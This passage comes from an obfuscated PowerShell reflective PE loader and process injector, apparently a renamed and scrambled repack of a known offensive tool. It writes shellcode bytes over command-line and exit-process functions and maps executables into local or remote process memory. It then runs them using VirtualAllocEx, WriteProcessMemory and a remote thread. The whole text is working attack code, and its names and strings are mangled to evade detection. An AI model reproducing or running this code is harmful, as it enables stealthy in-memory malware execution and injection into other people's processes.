    ${C`lwp} =  [System.Runtime.InteropServices.Marshal]::"S`T`RI`NG`ToHglobAlu`NI"(${EA`g`TS}  )
    ${c`la`pr} = [System.Runtime.InteropServices.Marshal]::"Strin`GtoHglO`Ba`lAnsi"(${e`AGts}  )

    [IntPtr]${G`CLa}  =   ${W3`2F}."GE`TpR`OcaDDre`SS"."INV`OKe"(  ${k`BhA}, (  'Get' +'Comman'  +  'dLin'+  'eA' )  )
    [IntPtr]${G`Clw}  =  ${w`32F}."gEtPro`cad`Dr`eSS"."inv`oKE"(${KB`hA}, ('Get'  + 'Com'+'mandL' + 'ineW'  ) )

    if (  ${g`Cla} -eq [IntPtr]::"zE`Ro" -or ${Gc`Lw} -eq [IntPtr]::"ZE`RO"  ) {
        throw ""
    }

    [Byte[]]${sh3`LL`k00d31}   =   @(  )
    if (${pO`InTer`Sz} -eq 8) {
        ${sH3lL`k00`D31} += 0x48
    }
    ${S`H3ll`K00D31} += 0xb8

    [Byte[]]${s`H3LlK00`D32}  = @(0xc3 )
    ${t`sZ} = ${sh`3lL`K00D31}."lE`NGtH" +   ${pO`iN`TErSZ}  + ${S`H3LL`k00`d32}."l`E`NgTh"

    ${GclA`oBPR}  =  [System.Runtime.InteropServices.Marshal]::"Al`Lo`CHglob`Al"( ${t`Sz}  )
    ${gCL`w`ObP} =   [System.Runtime.InteropServices.Marshal]::"A`l`LOCH`GlOBal"(  ${t`Sz})
    ${w3`2F}."mE`m`cPy"."I`NV`Oke"( ${G`clA`obPR}, ${G`clA}, [UInt64]${T`SZ}  ) > ${NU`ll}
    ${W`32f}."Mem`cpY"."i`NVO`ke"( ${G`cL`wobP}, ${g`Clw}, [UInt64]${t`Sz} ) > ${Nu`lL}
    ${RET`URN`A`Rray} += , (${gC`lA}, ${G`clAO`B`pR}, ${t`sz})
    ${re`T`URNaRR`Ay} += , (${G`CLw}, ${g`C`lWobP}, ${t`SZ})

    [UInt32]${O`PF} =  0
    ${Su`c`cesS}   =  ${W3`2f}."vI`RTualp`RO`Tect"."InVo`kE"( ${gC`la}, [UInt32]${T`sZ}, [UInt32](  ${w`32C}."p`AGe_`eX`e`cU`Te_rEad`WRITE"), [Ref]${o`pF} )
    if (  ${s`Uc`CEss} -eq ${F`ALsE} ) {
        throw ""
    }

    ${g`c`lat}  =   ${GC`la}
    WBTM -Bytes ${SH`3LLk00D31} -MADS ${gcl`AT}
    ${gC`lAt}  = ASIAU ${Gc`lAt} ( ${sh3`l`lk00d`31}."le`NgTH")
    [System.Runtime.InteropServices.Marshal]::"sTR`UC`TUrE`TOPTr"(${c`lA`pR}, ${GCl`At}, ${FA`LSe})
    ${g`ClAT} =   ASIAU ${gc`L`At} ${pOI`Nt`Er`Sz}
    WBTM -Bytes ${s`H`3LLk00d32} -MADS ${gc`lAT}

    ${w`32f}."V`Irt`UaLpR`ot`Ect"."iN`VOKE"(  ${gC`lA}, [UInt32]${t`sZ}, [UInt32]${O`PF}, [Ref]${O`pF}  ) > ${n`Ull}

    [UInt32]${o`pf}  =   0
    ${S`Ucce`SS} =  ${W`32f}."vIrtualP`R`otE`Ct"."i`NVO`Ke"(${GC`Lw}, [UInt32]${T`SZ}, [UInt32](  ${w3`2c}."Pag`E_`Ex`ecu`T`e_rEa`dWRItE"  ), [Ref]${O`pf}  )
    if (  ${s`UC`cess} -eq ${fa`lsE}) {
        throw ""
    }

    ${gcl`Wt}   =  ${GC`lw}
    WBTM -Bytes ${SH3Ll`k00D`31} -MADS ${g`cl`WT}
    ${Gc`LWt} =   ASIAU ${G`CL`WT} (  ${sh3`l`lk00d31}."lE`N`gtH" )
    [System.Runtime.InteropServices.Marshal]::"St`RUC`TU`REto`PTr"( ${Cl`wp}, ${GC`l`wT}, ${fAL`Se} )
    ${G`CLWT}  =  ASIAU ${gc`LWt} ${Po`iN`T`eRSZ}
    WBTM -Bytes ${SH3`lLk00`D32} -MADS ${GcL`wT}

    ${w`32F}."VIrt`UaL`Pr`OtEcT"."Inv`Oke"(${GC`Lw}, [UInt32]${T`sz}, [UInt32]${o`pf}, [Ref]${o`pF}) > ${nU`LL}

${DLlL`I`st}   = @(
    (  'm'  +  'SvCr80D.' + 'D'+'lL'  ),
    ('MsVc'  + 'R100'+  '.dLl' ),
    (  'MSvCr110'  +  '.Dl' +'l'  ),
    ('mS'  + 'v'+  'c' +  'r70.DlL'),
    (  'M'  + 'sV' +  'cr71D.d'  + 'll' ),
    ( 'mSVcR90.'  +'D' +'Ll' ),
    ('MSv' +  'C' +  'r110d' +  '.' + 'Dll'),
    ('MS'+'Vcr70'+'d.dll'),
    ('M' + 'SvCR9'+  '0d'+  '.dll' ),
    (  'm'+  'SVcr71.'+ 'dl' + 'L'  ),
    ( 'MsVcR1'  +  '00' +'d'  +  '.dll'  ),
    ( 'MsVcR'+ '8'  +'0.dll'  )
 )


    foreach (${D`lL} in ${dl`l`LiST}  ) {
        [IntPtr]${dl`LH`AndLe}  = ${w3`2f}."GET`MOdu`Leh`AnDle"."INVO`Ke"(  ${d`lL} )
        if (  ${dLlHa`N`dLE} -ne [IntPtr]::"zE`RO"  ) {
            [IntPtr]${w`kci`Dn} =  ${w3`2F}."GetpR`oCADDR`e`ss"."iN`Vo`kE"(  ${d`L`LHANd`LE}, ('_'  +  'w' +'cmdln' ) )
            [IntPtr]${ACM`d`LAr}  =  ${W3`2F}."ge`Tp`Ro`CaDDReSS"."In`VOKe"(${Dl`l`hANd`LE}, (  '_acmdl' +  'n'  ) )
            if (${Wk`CiDN} -eq [IntPtr]::"Ze`RO" -or ${Ac`Md`lar} -eq [IntPtr]::"ZE`Ro") {
            }

            ${n`ACLp}   = [System.Runtime.InteropServices.Marshal]::"S`Tr`ingtohg`LObal`ANsi"(${eA`GtS}  )
            ${naCL`Pr} =  [System.Runtime.InteropServices.Marshal]::"sTRInGtO`HGl`O`B`AlUni"( ${e`Ag`Ts}  )

            ${oA`CLP}   = [System.Runtime.InteropServices.Marshal]::"P`TrTOstR`U`cTuRe"(${A`cMDL`Ar}, [Type][IntPtr])
            ${o`A`lCMd} =  [System.Runtime.InteropServices.Marshal]::"PTRTO`StruC`T`URe"(${wkci`dN}, [Type][IntPtr])
            ${oaClPs`T`O`RagE}   =   [System.Runtime.InteropServices.Marshal]::"a`lloChGl`ObAL"( ${po`INteR`sz} )
            ${O`AL`cmdsGE}   = [System.Runtime.InteropServices.Marshal]::"aLloCH`glOB`Al"(${pO`inTe`Rsz}  )
            [System.Runtime.InteropServices.Marshal]::"St`RUcT`UreTO`ptR"( ${oAC`Lp}, ${oa`c`LP`STO`RAGe}, ${fA`l`SE})
            [System.Runtime.InteropServices.Marshal]::"sTRuC`TuR`Eto`PtR"(${o`ALCmd}, ${Oal`c`mdsge}, ${faL`se} )
            ${Re`T`URnar`RaY} += , ( ${AcmD`l`Ar}, ${OAcLPs`T`or`AGe}, ${P`OINT`E`Rsz} )
            ${Re`TUrnA`R`RAy} += , (${WKcI`Dn}, ${OAl`c`MDSGe}, ${PoI`N`TerSz}  )

            ${su`C`ceSs} = ${w`32f}."viRt`UAlP`ROTe`cT"."InV`oke"( ${acmdl`AR}, [UInt32]${PoINTE`R`sZ}, [UInt32]( ${w`32c}."P`A`ge_EX`e`CU`TE_REAdwrIte"), [Ref]${O`pf} )
            if ( ${S`UCC`EsS} -eq ${Fa`LSe} ) {
                throw ""
            }
            [System.Runtime.InteropServices.Marshal]::"ST`RUC`Tu`REToPtR"(  ${nA`ClP}, ${ACMDL`Ar}, ${F`Al`sE})
            ${w3`2f}."V`iRT`UalprOte`Ct"."INVO`Ke"(${acMd`L`Ar}, [UInt32]${POI`N`TeRsZ}, [UInt32](  ${o`pF} ), [Ref]${o`pF}  ) > ${N`ULL}

            ${SUC`CEss}  = ${W3`2f}."ViRTual`P`ROTecT"."i`N`VOkE"(  ${WK`c`Idn}, [UInt32]${P`OinT`ersZ}, [UInt32](  ${W`32c}."PA`GE_e`xEcutE`_ReADWr`i`TE"  ), [Ref]${o`pF} )
            if (${SuC`CE`Ss} -eq ${fA`LsE} ) {
                throw ""
            }
            [System.Runtime.InteropServices.Marshal]::"St`R`UC`T`UrETOPtR"(  ${n`A`CLPr}, ${wKc`I`Dn}, ${FA`lse})
            ${w3`2F}."vI`RtUal`PRO`T`Ect"."IN`VO`Ke"(  ${WKC`i`dn}, [UInt32]${poINt`ER`sZ}, [UInt32](  ${O`Pf}  ), [Ref]${O`Pf}  ) > ${n`Ull}
        }
    }

    ${RetUrN`A`RRAy}   =   @( )
    ${E`Fs} =   @()

    [IntPtr]${MSKh`Le}   =   ${w3`2F}."geTm`Oduleha`Nd`Le"."In`Vo`ke"((  'm'  + 'sc'  +  'oree.dll')  )
    if ( ${ms`kH`Le} -eq [IntPtr]::"z`ERo") {
        throw ""
    }
    [IntPtr]${c`epa}  =  ${w`32F}."gETpr`ocadDRE`sS"."iNv`OkE"(${msKH`Le}, ('CorE' +'xit'  + 'Proc' + 'ess' ) )
    if ( ${CE`Pa} -eq [IntPtr]::"ze`RO"  ) {
        throw ""
    }
    ${e`Fs} += ${c`EpA}

    [IntPtr]${e`P`ARD}   =  ${w3`2f}."G`eT`PRo`cAddreSS"."i`Nv`Oke"(${K`32H}, ('ExitPro' + 'c'+  'ess'  ) )
    if ( ${E`PARd} -eq [IntPtr]::"Z`eRo" ) {
        throw ""
    }
    ${E`FS} += ${ep`Ard}

    [UInt32]${O`pF}   =  0
    foreach ( ${p`eFaR} in ${E`FS} ) {
        ${PEf`At} =  ${pE`F`AR}

        [Byte[]]${Sh`3lL`k00D31}  =   @(0xbb)
        [Byte[]]${sH3L`lK00D32}  = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb )

        if ( ${POIN`Te`RSz} -eq 8) {
            [Byte[]]${Sh3llK00D`31} =  @(0x48, 0xbb)
            [Byte[]]${s`H3l`LK00D32}   =  @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb  )
        }
        [Byte[]]${sh`3lL`k00D33} =   @(0xff, 0xd3  )
        ${t`Sz}  = ${s`h`3lLK00D31}."LE`NgtH" +   ${PoI`Nter`sz} +   ${Sh3`llk00`D32}."Len`G`TH" + ${Po`In`TErsz} + ${s`H3L`Lk00`d33}."l`eN`GTH"

        [IntPtr]${e`TAr}   = ${W3`2f}."ge`Tp`Roc`ADDreSS"."I`NvokE"( ${k`32h}, ( 'E' + 'x'+'itThread' )  )
        if (${eT`AR} -eq [IntPtr]::"zE`RO" ) {
            throw ""
        }

        ${su`C`Cess}   =  ${W`32F}."vIRTUaLP`R`o`TeCt"."i`NVoke"( ${pE`FAr}, [UInt32]${t`SZ}, [UInt32]${W`32c}."pA`ge_EXEcUte_RE`ADW`RITe", [Ref]${O`PF}  )
        if ( ${SUc`c`esS} -eq ${f`Alse} ) {
            throw ""
        }

        ${eP`ObP}  =   [System.Runtime.InteropServices.Marshal]::"aLL`OChGlOB`AL"(${t`SZ})
        ${w3`2f}."mE`mcpy"."iNV`OKe"(  ${EPO`Bp}, ${P`eF`Ar}, [UInt64]${T`sz}) > ${nu`Ll}
        ${r`ET`URNaRRAy} += , (  ${PEF`AR}, ${EP`o`BP}, ${t`SZ} )

        WBTM -Bytes ${SH3`LLK00`d31} -MADS ${p`eFat}
        ${p`e`FAT} = ASIAU ${PEF`At} (  ${S`h3L`lk00d31}."len`GTh"  )
        [System.Runtime.InteropServices.Marshal]::"sTRuC`Ture`T`optr"(${eD`Bp}, ${pEF`At}, ${f`ALSE} )
        ${pEf`At} =   ASIAU ${PE`FAt} ${P`O`IN`Tersz}
        WBTM -Bytes ${sH3`Ll`K00D32} -MADS ${PEF`At}
        ${p`eFat}  = ASIAU ${PE`F`AT} (${S`h3llK00`d`32}."LeN`gtH")
        [System.Runtime.InteropServices.Marshal]::"sTrUC`TU`REt`O`PTR"( ${Et`Ar}, ${p`eFAt}, ${faL`sE})
        ${pE`FAT}   =   ASIAU ${p`e`FAT} ${p`OIN`TErSz}
        WBTM -Bytes ${sh3`L`L`k00D33} -MADS ${P`efAT}

        ${W3`2F}."VIR`Tua`lProT`e`Ct"."invo`kE"( ${pe`FAR}, [UInt32]${t`sz}, [UInt32]${o`pf}, [Ref]${o`PF}  ) > ${n`ULL}
    }

    Write-Output ${retuR`Na`RRaY}
}

	
	
		
		
Function CaOMa {
    Param( 
        [Parameter(  pOSITion   =  0, mAnDaToRy  =  ${Tr`UE} )]
        [Array[]]
        ${C`oPYi`NfO},

        [Parameter(pOsITIOn   = 1, MaNdaTOrY  = ${t`RUe}  )]
        [System.Object]
        ${W3`2f},

        [Parameter(positioN   =   2, MaNDatorY   =  ${T`RUe})]
        [System.Object]
        ${w3`2c}
      )

    [UInt32]${O`pf} =  0
    foreach (  ${in`FO} in ${CO`PY`iNfO} ) {
        ${Suc`c`ESs} = ${w`32f}."v`IRT`U`AlprOtEct"."invo`kE"(  ${IN`FO}[0], [UInt32]${IN`FO}[2], [UInt32]${W3`2c}."p`Ag`e_EXE`cut`E_Re`ADWr`iTe", [Ref]${O`Pf} )
        if (  ${suC`c`ESs} -eq ${fal`se} ) {
            throw ""
        }

        ${W3`2F}."m`emc`Py"."I`NVO`Ke"(${in`Fo}[0], ${I`NFo}[1], [UInt64]${I`NfO}[2] ) > ${Nu`lL}

        ${W`32f}."VI`Rtua`Lp`ROtE`ct"."I`N`VOKE"( ${I`Nfo}[0], [UInt32]${iN`Fo}[2], [UInt32]${o`Pf}, [Ref]${O`pF} ) > ${NU`LL}
    }
}



		
		
		
        Function HMpa {
    Param(
        [Parameter( POSITiOn  =   0, MaNDaTory   =  ${T`RUE})]
        [IntPtr]
        ${P`eH},

        [Parameter( pOSitioN  =  1, MaNDATORy  =  ${tr`UE}  )]
        [String]
        ${F`UNCtIon`Name}
    )

    ${W`32T}   =   GW32T
    ${w3`2c} =  GW32C
    ${P`Ei}  = GPBID -PEH ${P`eH} -W32T ${w3`2t} -W32C ${W`32C}

    if (${P`Ei}."Im`AGE_nT_hE`A`dErS"."o`pT`IOnaL`HeadEr"."EXpO`R`Tta`BlE"."Si`ze" -eq 0 ) {
        return [IntPtr]::"Z`eRo"
    }
    ${etb`Lep`Tr}  =   ASIAU (  ${P`Eh} ) ( ${P`eI}."IM`AgE_Nt_`h`Ea`DERS"."O`P`TIOnAL`he`ADeR"."E`XPoRT`Ta`Ble"."vIRtUA`LaDDr`ess"  )
    ${etb`LE}   =   [System.Runtime.InteropServices.Marshal]::"pt`RtOSt`RU`ctUre"(${e`TBLE`PTr}, [Type]${W`32T}."ImAge_`ExP`ORt`_dIrEC`TorY" )

    for (${I} = 0;  ${i} -lt ${e`Tb`Le}."n`U`mb`erOFNAM`Es" ;  ${i}++  ) {
        ${no`FT} =   ASIAU (  ${p`eh}) (  ${ET`BLE}."ADdRE`S`s`OfNam`es" +  (${I} * [System.Runtime.InteropServices.Marshal]::"S`IZe`oF"(  [Type][UInt32] )  )  )
        ${Nam`ePnt`ER}   = ASIAU (${P`Eh}) (  [System.Runtime.InteropServices.Marshal]::"pTR`T`osTRU`CTure"(${N`Oft}, [Type][UInt32] ) )
        ${na`mE} =  [System.Runtime.InteropServices.Marshal]::"pTRT`o`StriNgaN`si"( ${NaMe`pNt`Er}  )

        if ( ${N`AmE} -ceq ${FU`Nc`TI`onn`AME}  ) {
            ${opT`Er} =  ASIAU ( ${p`EH}  ) (  ${eTB`lE}."ADdr`e`S`sOfName`o`RDinalS"  +  (${I} * [System.Runtime.InteropServices.Marshal]::"Si`zeof"(  [Type][UInt16])) )
            ${F`Ix} =   [System.Runtime.InteropServices.Marshal]::"PT`RTo`StRu`Ct`Ure"( ${opT`Er}, [Type][UInt16] )
            ${f`OT`AddR}   =   ASIAU (  ${P`EH}  ) (  ${Et`BlE}."ADdrEssOFfun`C`Ti`ons"  +   (${F`ix} * [System.Runtime.InteropServices.Marshal]::"SI`zEoF"([Type][UInt32]) ))
            ${F`OT}   = [System.Runtime.InteropServices.Marshal]::"pT`R`To`sT`RUcTUre"(${FoTa`Ddr}, [Type][UInt32])
            return ASIAU ( ${P`eH} ) (${f`ot}  )
        }
    }

    return [IntPtr]::"Z`ERo"
}



        Function IMllA {
            Param(  
                [Parameter(   POSiTION =   0, MANDatoRY =   ${t`Rue}   )]
                [Byte[]]
                ${PneB`I`TES},
		
                [Parameter(  posITioN =   1, mANdAToRY  =  ${f`AlSE} )]
                [String]
                ${c`omMA`N`dA`R`Guments},
		
                [Parameter(POSItIOn  =   2, manDAtOrY = ${f`A`lSE} )]
                [IntPtr]
                ${R`PH}
              )
		
            ${pOi`NtER`sz} = [System.Runtime.InteropServices.Marshal]::"s`iZeof"( [Type][IntPtr])
		
			
            ${W3`2C}   =   GW32C
            ${w3`2F}  = Get-W32F
            ${W`32T} = GW32T
		
            ${R`LG}  = ${Fa`lse}
            if ( ( ${R`ph} -ne ${nu`ll}) -and ( ${R`Ph} -ne [IntPtr]::"Ze`Ro"  )  ) {
                ${r`Lg} =  ${t`Rue}
            }
		
			
            ${P`ei}  =   GPBI -PnEBites ${pn`eB`iTEs} -W32T ${w3`2T}
            ${O`Ib}   =   ${p`EI}."oRIG`in`ALiM`AGEba`se"
            ${N`xC}  =   ${T`RUe}
            if ( (  [Int] ${P`EI}."dLlc`harAcTE`Rist`I`cs" -band ${w`32c}."iMagE_`d`LLchArACT`Eri`StiC`S_`N`x_C`ompaT"  ) -ne ${W`32C}."IM`Ag`E`_dL`LcHARAC`TeR`IstIcS`_`N`x_comPAt" ) {
                ${N`xc} =   ${FAL`se}
            }
		
		
			
            ${P6`4B} =   ${T`RUE}
            if (${r`lG} -eq ${T`Rue}) {
                ${k`32h}   =  ${w3`2f}."gETmodUleh`An`DlE"."IN`VokE"((  'kernel' +'32.' +'d'  +  'll' ) )
                ${REs`U`LT}   =  ${W3`2f}."geT`pR`ocAd`D`RESS"."I`NvO`kE"( ${K3`2h}, (  'IsWow64P' +  'r'  +'ocess'  )  )
                if (  ${R`esUlt} -eq [IntPtr]::"z`ERO"  ) {
                    throw ""
                }
			
                [Bool]${w6`4p}  =  ${F`Al`se}
                ${Su`CCE`Ss} =  ${W`32F}."I`sW`oW64p`ROCEsS"."In`VokE"(  ${r`PH}, [Ref]${W6`4p} )
                if (${SU`cceSS} -eq ${f`ALsE}  ) {
                    throw ""
                }
			
                if (( ${W`64P} -eq ${tr`Ue}) -or ( (  ${W`64P} -eq ${fAL`Se}  ) -and ([System.Runtime.InteropServices.Marshal]::"SI`ZEOf"([Type][IntPtr]) -eq 4  ) ) ) {
                    ${p6`4b} =  ${Fa`lSE}
                }
			
				
                ${p`S6`4b}  =   ${t`RUe}
                if (  [System.Runtime.InteropServices.Marshal]::"sIZe`Of"([Type][IntPtr]  ) -ne 8 ) {
                    ${ps6`4b}   = ${fA`Lse}
                }
                if (${pS6`4b} -ne ${P6`4B} ) {
                    throw ""
                }
            }
            else {
                if (  [System.Runtime.InteropServices.Marshal]::"S`I`zeOF"( [Type][IntPtr]) -ne 8) {
                    ${P`64B}  = ${f`ALSE}
                }
            }
            if ( ${p6`4b} -ne ${p`eI}."pE`6`4BiT") {
                Throw ""
            }
		

			
		
            [IntPtr]${L`AR}  =  [IntPtr]::"z`eRO"
            if ( (  [Int] ${p`ei}."DllCHARACt`erI`stI`cS" -band ${w3`2C}."iM`AgE_`d`LlcHaRacteRIST`I`CS_dyNaMiC_ba`SE"  ) -ne ${w3`2c}."ImaGe`_D`llcharactEr`iST`ICs_D`YN`AMi`c_BASE") {
                -WarningAction CONTiNue
                [IntPtr]${l`Ar}   =  ${O`iB}
            }

            ${P`eh} = [IntPtr]::"Z`eRO"				
            ${E`ph}   = [IntPtr]::"Ze`Ro"		
            if ( ${R`lg} -eq ${tR`UE} ) {
				
                ${P`eh}  =  ${w`32F}."vir`Tu`AlA`LLOC"."Inv`OKe"([IntPtr]::"ze`Ro", [UIntPtr]${P`Ei}."SiZ`EOf`im`AGE", ${w`32C}."MEm_cO`m`Mit" -bor ${w3`2c}."m`em_REs`ER`VE", ${w`32C}."p`Age`_reA`dWrItE"  )
			
				
                ${e`Ph}   = ${W`32F}."vI`Rt`UaLaLL`oC`eX"."In`V`oke"(  ${r`ph}, ${L`Ar}, [UIntPtr]${p`ei}."s`iZeoF`iMage", ${w3`2c}."mE`m_co`mMit" -bor ${W`32c}."mE`M`_rES`eRVe", ${w3`2C}."Page_E`xE`Cute_`REAdW`RitE" )
                if (${E`pH} -eq [IntPtr]::"zE`RO" ) {
                    throw ""
                }
            }
            else {
                if (${N`XC} -eq ${T`RUe}  ) {
                    ${P`eh}  =   ${w3`2f}."VI`RTUa`lA`lloC"."iN`VOKe"(  ${L`AR}, [UIntPtr]${p`Ei}."s`iZEo`F`ImAgE", ${W3`2C}."M`E`m_cOM`mIt" -bor ${w`32c}."Mem`_`ReSeRVe", ${w3`2c}."pAgE`_re`AD`w`RIte" )
                }
                else {
                    ${p`eH}  =  ${w`32F}."Vir`TuaL`A`LLoc"."INv`oKE"(${l`AR}, [UIntPtr]${P`ei}."siZ`E`OF`iMAgE", ${W3`2c}."mem`_C`OMm`it" -bor ${W`32C}."m`em_R`eSeR`VE", ${w3`2c}."Pa`ge_e`xEcu`TE_REaD`w`R`ItE" )
                }
                ${E`Ph} = ${P`eH}
            }
		
            [IntPtr]${PeENDAdD`R`eSS} =  ASIAU ( ${P`Eh} ) ( [Int64]${p`Ei}."siZ`e`OFimAgE"  )
            if (${P`Eh} -eq [IntPtr]::"zE`Ro" ) { 
                throw ""
            }		
            [System.Runtime.InteropServices.Marshal]::"c`oPy"(${Pn`eBiT`eS}, 0, ${p`eH}, ${P`ei}."SiZeOF`HEaDe`Rs" ) > ${N`Ull}
		
		
			
            ${P`EI}   =   GPBID -PEH ${P`EH} -W32T ${w`32t} -W32C ${W`32c}
            ${p`eI}   |   aM -MemberType $('No' +'te'+ 'P' +'r' +'op' +  'e' + 'r' +  'ty'  ) -Name $('En'  + 'dA'  +  'dd'  +  're'+ 'ss') -Value ${Peen`DAd`D`ReSS}
            ${p`eI}  |   aM -MemberType $('No' +'te' + 'P'+  'r' +'op' +  'e' + 'r' +  'ty'  ) -Name $('Ef'+  'fe'  +'ct' +'iv' +'eP' + 'EH'  +  'an'+  'dl'+  'e'  ) -Value ${E`pH}
		
		
			
            KOPSEC -PnEBites ${pn`e`BIt`Es} -PEI ${p`Ei} -W32F ${w3`2F} -W32T ${W3`2T}
		
		
			
            Update-MADSes -PEI ${P`eI} -OIB ${O`iB} -W32C ${w`32C} -W32T ${w`32t}

		
			
            if (${R`LG} -eq ${Tr`Ue} ) {
                IDIS -PEI ${P`EI} -W32F ${w`32f} -W32T ${W3`2t} -W32C ${W`32c} -RemoteProcHandle ${R`PH}
            }
            else {
                IDIS -PEI ${P`EI} -W32F ${W`32F} -W32T ${w`32T} -W32C ${w`32C}
            }
		
		
			
            if ( ${r`lG} -eq ${Fal`se}  ) {
                if ( ${n`Xc} -eq ${T`Rue} ) {
                    UMPFS -PEI ${p`ei} -W32F ${w3`2F} -W32C ${W3`2c} -W32T ${w`32T}
                }
            }
		
		
			
            if (  ${r`LG} -eq ${tR`UE}) {
                [UInt32]${N`Bw}  = 0
                ${su`c`Cess} =  ${w3`2F}."WRi`TEp`RoCe`s`sme`MoRy"."iNvo`ke"( ${R`ph}, ${e`ph}, ${P`EH}, [UIntPtr]( ${P`Ei}."sI`ZEoF`i`MAge"), [Ref]${N`BW}  )
                if (${su`Cc`eSs} -eq ${fA`lse}) {
                    Throw ""
                }
            }
		
		
			
            if (${p`ei}."fILet`YpE" -ieq $('D'+  'l'  +'L'  ) ) {
                if (${r`lG} -eq ${f`AlSE}  ) {
                    ${mai`ND`l`libr`A`RypTR}   =   ASIAU (${P`ei}."PehA`N`dlE") (${p`ei}."i`MaG`E`_n`T_hEADers"."Op`TIONaL`h`ea`DEr"."a`dD`REsSOfeN`TRYPOi`Nt")
                    ${MAiNd`l`l`iBRaRy`dE`LEg`ATE}   =   GTDP @([IntPtr], [UInt32], [IntPtr] ) ( [Bool])
                    ${MaI`N`d`llIBRAry}   =   [System.Runtime.InteropServices.Marshal]::"gEtdeLe`GA`TEFO`RfUNCti`OnpOin`T`Er"( ${MaiN`dlLiB`Rar`yPTr}, ${mA`in`dLLIbRA`RydE`L`e`gAtE} )
				
                    ${MAINDLLib`Ra`Ry}."InV`OkE"(  ${P`Ei}."P`e`hAndlE", 1, [IntPtr]::"Z`eRo") > ${NU`lL}
                }
                else {
                    ${maINDLLI`BRA`Ryp`TR} = ASIAU (  ${E`PH}) (${P`ei}."IMa`g`E_nT_hEa`D`ERs"."O`P`Ti`OnALHeaDER"."aDDR`Esso`F`eN`TryPOiNt"  )
			
                    if ( ${p`Ei}."pe`64`Bit" -eq ${T`RUE}  ) {
						
                        ${cd`MS1}   = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                        ${Cd`m`s2}   =  @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8  )
                        ${cd`m`s3} =  @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3  )
                    }
                    else {
						
                        ${C`dmS1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9 )
                        ${CD`mS2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8  )
                        ${CDm`s3}  = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3  )
                    }
                    ${SClen`g`Th}   =  ${cD`ms1}."len`GtH"  + ${c`dm`S2}."Le`NgTH"   +   ${c`dms3}."lE`Ngth"   +   ( ${P`o`i`NTerSZ} * 2 )
                    ${s`M}  =   [System.Runtime.InteropServices.Marshal]::"AlLoCh`Gl`Ob`AL"(${sc`LeNG`Th})
                    ${sm`oRiG`in`Al}   =  ${sM}
				
                    WBTM -Bytes ${CD`m`s1} -MADS ${sM}
                    ${SM} =   ASIAU ${S`m} ( ${c`dMs1}."lE`N`GTh" )
                    [System.Runtime.InteropServices.Marshal]::"S`TrUc`T`Ur`EToPtr"(${E`pH}, ${S`m}, ${FAL`sE}  )
                    ${s`M}  =  ASIAU ${Sm} (  ${p`oIN`T`ErsZ})
                    WBTM -Bytes ${C`Dm`S2} -MADS ${S`m}
                    ${sM}  = ASIAU ${s`m} ( ${c`DMS2}."LEN`G`TH" )
                    [System.Runtime.InteropServices.Marshal]::"sTruC`T`UR`eToptr"(  ${mA`I`N`D`LlIB`RaRyPTR}, ${S`M}, ${fal`Se} )
                    ${Sm}  = ASIAU ${S`m} (${poi`N`TeRSz}  )
                    WBTM -Bytes ${cD`ms3} -MADS ${SM}
                    ${sM} = ASIAU ${SM} ( ${C`D`MS3}."lE`Ngth")
				
                    ${rsc`AD`dr}   =  ${w3`2F}."vir`Tu`AlAlL`OC`EX"."I`N`VoKe"( ${R`PH}, [IntPtr]::"z`ERO", [UIntPtr][UInt64]${SCl`eNg`TH}, ${w`32C}."mem_c`OM`mIt" -bor ${W3`2c}."m`em_Re`serVe", ${w`32C}."PAGe_`exEcU`TE`_`ReadW`RitE")
                    if (${r`scAd`Dr} -eq [IntPtr]::"z`erO" ) {
                        throw ""
                    }
				
                    ${S`U`cCesS} =  ${W3`2f}."wR`ITeP`Ro`CEsSM`eM`oRY"."inV`o`ke"( ${R`pH}, ${R`scaDdR}, ${SMOR`IgI`Nal}, [UIntPtr][UInt64]${sC`lE`NgtH}, [Ref]${n`BW})
                    if (  (  ${S`UCCess} -eq ${fA`Lse} ) -or ([UInt64]${N`BW} -ne [UInt64]${SC`LENg`Th}  )  ) {
                        throw ""
                    }

                    ${rt`Hle}   =   ICRT -ProLEv ${R`pH} -SAYS1 ${r`sc`AddR} -W32F ${W3`2f}
                    ${r`e`sulT} =  ${w3`2f}."wA`itFor`Sin`g`leoBJ`eCT"."iN`VOKe"(  ${Rt`HlE}, 20000 )
                    if (  ${ReS`Ult} -ne 0) {
                        throw ""
                    }
				
                    ${W`32F}."V`iRtuAL`FRe`EeX"."iNV`Oke"( ${r`Ph}, ${R`ScAdDR}, [UIntPtr][UInt64]0, ${W`32c}."mE`M_REl`ea`sE") > ${N`Ull}
                }
            }
            elseif (${P`Ei}."Fi`lETYpE" -ieq ( 'EX' +'E'  )  ) {
				
                [IntPtr]${e`dbp}   = [System.Runtime.InteropServices.Marshal]::"aL`LOCHgLOb`AL"(  1 )
                [System.Runtime.InteropServices.Marshal]::"wrITeB`ytE"(  ${eD`Bp}, 0, 0x00  )
                ${ow`mI} = UEFC -PEI ${P`Ei} -W32F ${W3`2F} -W32C ${W3`2C} -ExeArguments ${c`ommaND`Arg`UmE`NTs} -ExeDoneBytePtr ${e`dBP}

				
				
                [IntPtr]${eXe`mAI`NpTr}  = ASIAU ( ${P`ei}."peHAnD`lE") (  ${p`eI}."Im`Age`_nt`_hEADE`Rs"."Opt`iOnalh`ea`d`Er"."AdDre`SS`OFEn`TRY`poinT")

                ${W`32f}."crE`A`T`etHREad"."in`VoKE"(  [IntPtr]::"ze`Ro", [IntPtr]::"ZE`RO", ${E`x`emA`iNPTR}, [IntPtr]::"zE`Ro", ([UInt32]0), [Ref]( [UInt32]0 ) ) > ${NU`Ll}

                while ( ${T`RuE}) {
                    [Byte]${T`H`RE`AdDOnE}  =   [System.Runtime.InteropServices.Marshal]::"re`Adby`Te"(  ${E`dbP}, 0  )
                    if (  ${thREAd`d`o`NE} -eq 1) {
